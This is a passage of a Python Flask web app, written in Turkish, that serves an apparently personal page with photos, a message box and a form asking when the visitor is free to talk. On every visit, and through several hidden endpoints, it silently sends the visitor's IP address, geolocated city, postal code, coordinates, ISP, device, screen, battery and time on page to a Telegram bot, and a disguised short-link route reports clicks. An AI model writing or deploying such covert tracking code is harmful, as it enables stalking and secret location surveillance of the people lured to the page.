    }
    setInterval(mesajKontrol, 6000);
    setTimeout(mesajKontrol, 2000);
  </script>
</body>
</html>
"""


def bildirim_gonder(mesaj):
    if not TELEGRAM_TOKEN or not CHAT_ID:
        print("Telegram credentials eksik.")
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
    try:
        r = requests.post(url, json=payload, timeout=5)
        return r.status_code == 200
    except Exception as e:
        print("Bildirim gönderilemedi:", e)
        return False


def gercek_ip_al(req):
    """Proxy arkasındaki gerçek IP'yi al."""
    for header in ("X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP", "True-Client-IP"):
        val = req.headers.get(header)
        if val:
            return val.split(",")[0].strip()
    return req.remote_addr or "Bilinmiyor"


def ip_konum_al(ip):
    """ip-api.com üzerinden konum bilgisi çek."""
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query",
            timeout=5
        )
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                return d
    except Exception:
        pass
    return None


def ziyaretci_mesaj_olustur(req, ek_bilgi=None):
    """Ziyaretçi hakkında detaylı Telegram mesajı oluştur."""
    from datetime import datetime, timezone
    ip = gercek_ip_al(req)
    ua = req.headers.get("User-Agent", "Bilinmiyor")
    dil = req.headers.get("Accept-Language", "Bilinmiyor")
    referer = req.headers.get("Referer", "Doğrudan giriş")
    zaman = datetime.now(timezone.utc).strftime("%d.%m.%Y %H:%M:%S UTC")

    konum = ip_konum_al(ip)

    satirlar = [
        "👤 <b>YENİ ZİYARETÇİ</b>",
        "",
        f"🕐 <b>Zaman:</b> {zaman}",
        f"🌐 <b>IP Adresi:</b> <code>{ip}</code>",
    ]

    if konum:
        satirlar += [
            f"🏳️ <b>Ülke:</b> {konum.get('country', '?')}",
            f"📍 <b>Şehir:</b> {konum.get('city', '?')} / {konum.get('regionName', '?')}",
            f"📮 <b>Posta Kodu:</b> {konum.get('zip', '?')}",
            f"🗺️ <b>Koordinat:</b> {konum.get('lat', '?')}, {konum.get('lon', '?')}",
            f"📡 <b>ISS:</b> {konum.get('isp', '?')}",
            f"🏢 <b>Org:</b> {konum.get('org', '?')}",
        ]

    satirlar += [
        "",
        f"🖥️ <b>Tarayıcı/Cihaz:</b> {ua}",
        f"🌍 <b>Dil:</b> {dil}",
        f"🔗 <b>Nereden Geldi:</b> {referer}",
    ]

    if ek_bilgi:
        satirlar += [
            "",
            "📊 <b>Ekran & Sistem Bilgisi:</b>",
            f"📐 <b>Ekran:</b> {ek_bilgi.get('ekran', '?')}",
            f"🖱️ <b>Pencere:</b> {ek_bilgi.get('pencere', '?')}",
            f"⏰ <b>Yerel Saat:</b> {ek_bilgi.get('saat', '?')}",
            f"🌐 <b>Zaman Dilimi:</b> {ek_bilgi.get('zaman_dilimi', '?')}",
            f"💻 <b>Platform:</b> {ek_bilgi.get('platform', '?')}",
            f"🔋 <b>Pil:</b> {ek_bilgi.get('pil', '?')}",
            f"🌐 <b>Çevrimiçi mi:</b> {ek_bilgi.get('cevrimici', '?')}",
        ]

    return "\n".join(satirlar)


@app.route("/api/fotos")
def foto_listesi():
    klasor = os.path.join(app.root_path, 'static', 'photos')
    uzantilar = {'.jpg', '.jpeg', '.png', '.webp', '.gif'}
    try:
        dosyalar = [
            f for f in os.listdir(klasor)
            if os.path.splitext(f)[1].lower() in uzantilar
        ]
    except Exception:
        dosyalar = []
    return jsonify(dosyalar)


@app.route("/")
def ana_sayfa():
    mesaj = ziyaretci_mesaj_olustur(request)
    bildirim_gonder(mesaj)
    return render_template_string(HTML_SAYFA, basarili=False, hata=False, vapid_public=VAPID_PUBLIC_KEY)


@app.route("/api/bilgi", methods=["POST"])
def tarayici_bilgi():
    """JavaScript'ten gelen ekran/sistem bilgilerini al ve Telegram'a gönder."""
    try:
        veri = request.get_json(force=True, silent=True) or {}
        ip = gercek_ip_al(request)
        ek = {
            "ekran":       veri.get("ekran", "?"),
            "pencere":     veri.get("pencere", "?"),
            "saat":        veri.get("saat", "?"),
            "zaman_dilimi":veri.get("zaman_dilimi", "?"),
            "platform":    veri.get("platform", "?"),
            "pil":         veri.get("pil", "?"),
            "cevrimici":   veri.get("cevrimici", "?"),
        }
        mesaj = f"📊 <b>EK BİLGİ</b> — <code>{ip}</code>\n\n"
        mesaj += "\n".join([
            f"📐 <b>Ekran:</b> {ek['ekran']}",
            f"🖱️ <b>Pencere:</b> {ek['pencere']}",
            f"⏰ <b>Yerel Saat:</b> {ek['saat']}",
            f"🌐 <b>Zaman Dilimi:</b> {ek['zaman_dilimi']}",
            f"💻 <b>Platform:</b> {ek['platform']}",
            f"🔋 <b>Pil:</b> {ek['pil']}",
            f"🌐 <b>Çevrimiçi mi:</b> {ek['cevrimici']}",
        ])
        bildirim_gonder(mesaj)
    except Exception as e:
        print("Bilgi endpoint hatası:", e)
    return jsonify({"ok": True})


@app.route("/api/push-abone", methods=["POST"])
def push_abone():
    """Tarayıcının push aboneliğini kaydet."""
    try:
        sub = request.get_json(force=True, silent=True) or {}
        if sub.get("endpoint"):
            upstash("SET", "push_sub", json.dumps(sub))
    except Exception as e:
        print("Push abone hatası:", e)
    return jsonify({"ok": True})


@app.route("/api/gonder", methods=["POST"])
def admin_gonder():
    """Admin bu endpoint'e POST yaparak mesaj gönderir (site kapalı olsa bile)."""
    try:
        veri = request.get_json(force=True, silent=True) or {}
        if veri.get("secret") != ADMIN_SECRET:
            return jsonify({"hata": "Yetkisiz"}), 403
        metin = str(veri.get("mesaj", "")).strip()
        if not metin:
            return jsonify({"hata": "Mesaj boş"}), 400

        # Siteye girince görünsün diye Redis'e yaz
        upstash("SET", "bekleyen_mesaj", metin)
        upstash("EXPIRE", "bekleyen_mesaj", 86400)  # 24 saat sonra sil

        # Push bildirimi gönder (site kapalı olsa bile)
        sub_raw = upstash("GET", "push_sub")
        push_sonucu = "Abonelik yok"
        if sub_raw:
            try:
                from pywebpush import webpush, WebPushException
                sub_dict = json.loads(sub_raw)
                webpush(
                    subscription_info=sub_dict,
                    data=json.dumps({"title": "💌 Sana bir mesaj var", "body": metin}),
                    vapid_private_key=VAPID_PRIVATE_KEY,
                    vapid_claims={"sub": VAPID_CONTACT},
                )
                push_sonucu = "Gönderildi"
            except Exception as pe:
                push_sonucu = f"Hata: {pe}"

        return jsonify({"ok": True, "push": push_sonucu})
    except Exception as e:
        print("Admin gönder hatası:", e)
        return jsonify({"hata": str(e)}), 500


@app.route("/api/mesaj-var", methods=["GET"])
def mesaj_var():
    """Kullanıcı sitedeyken bekleyen mesajı çeker ve Redis'ten siler."""
    try:
        metin = upstash("GETDEL", "bekleyen_mesaj")
        if metin:
            return jsonify({"mesaj": metin})
    except Exception:
        pass
    return jsonify({"mesaj": None})


@app.route("/api/sure", methods=["POST"])
def sure_al():
    """Kullanıcının sayfada kaldığı süreyi al ve Telegram'a gönder."""
    try:
        veri = request.get_json(force=True, silent=True) or {}
        saniye = int(veri.get("saniye", 0))
        ip = gercek_ip_al(request)
        if saniye < 60:
            sure_str = f"{saniye} saniye"
        else:
            dakika = saniye // 60
            kalan = saniye % 60
            sure_str = f"{dakika} dakika {kalan} saniye"
        bildirim_gonder(f"⏱️ <b>Sayfada Kalınan Süre</b>\n🌐 <b>IP:</b> <code>{ip}</code>\n🕒 <b>Süre:</b> {sure_str}")
    except Exception as e:
        print("Süre endpoint hatası:", e)
    return "", 204


@app.route("/musaitlik", methods=["POST"])
def musaitlik_al():
    """Müsaitlik formundan gelen veriyi Telegram'a gönder."""
    try:
        veri = request.get_json(force=True, silent=True) or {}
        gunler = veri.get("gunler", "?")
        baslangic = veri.get("baslangic", "?")
        bitis = veri.get("bitis", "?")
        sure_dk = veri.get("sure_dk", "?")
        ip = gercek_ip_al(request)
        mesaj = (
            f"📅 <b>MÜSAİTLİK FORMU</b>\n"
            f"🌐 <b>IP:</b> <code>{ip}</code>\n\n"
            f"📆 <b>Günler:</b> {gunler}\n"
            f"🕐 <b>Saat:</b> {baslangic} – {bitis}\n"
            f"⏱ <b>Konuşma Süresi:</b> {sure_dk} dakika"
        )
        basarili = bildirim_gonder(mesaj)
        return jsonify({"ok": basarili})
    except Exception as e:
        print("Müsaitlik endpoint hatası:", e)
        return jsonify({"ok": False}), 500


@app.route("/mesaj", methods=["POST"])
def mesaj_al():
    metin = request.form.get("mesaj", "").strip()
    if not metin:
        return render_template_string(HTML_SAYFA, basarili=False, hata=True, vapid_public=VAPID_PUBLIC_KEY)
    ip = gercek_ip_al(request)
    basarili = bildirim_gonder(f"📩 <b>Yeni Mesaj</b>\n🌐 <b>IP:</b> <code>{ip}</code>\n\n{metin}")
    return render_template_string(
        HTML_SAYFA,
        basarili=basarili,
        hata=not basarili,
        vapid_public=VAPID_PUBLIC_KEY,
    )


@app.route("/sw.js")
def service_worker():
    return send_from_directory("static", "sw.js", mimetype="application/javascript")


@app.route("/git")
def yonlendir():
    bildirim_gonder("⚠️ Kısaltılmış linkine birisi tıkladı!")
    return redirect(HEDEF_URL)


if __name__ == "__main__":
    app.run()
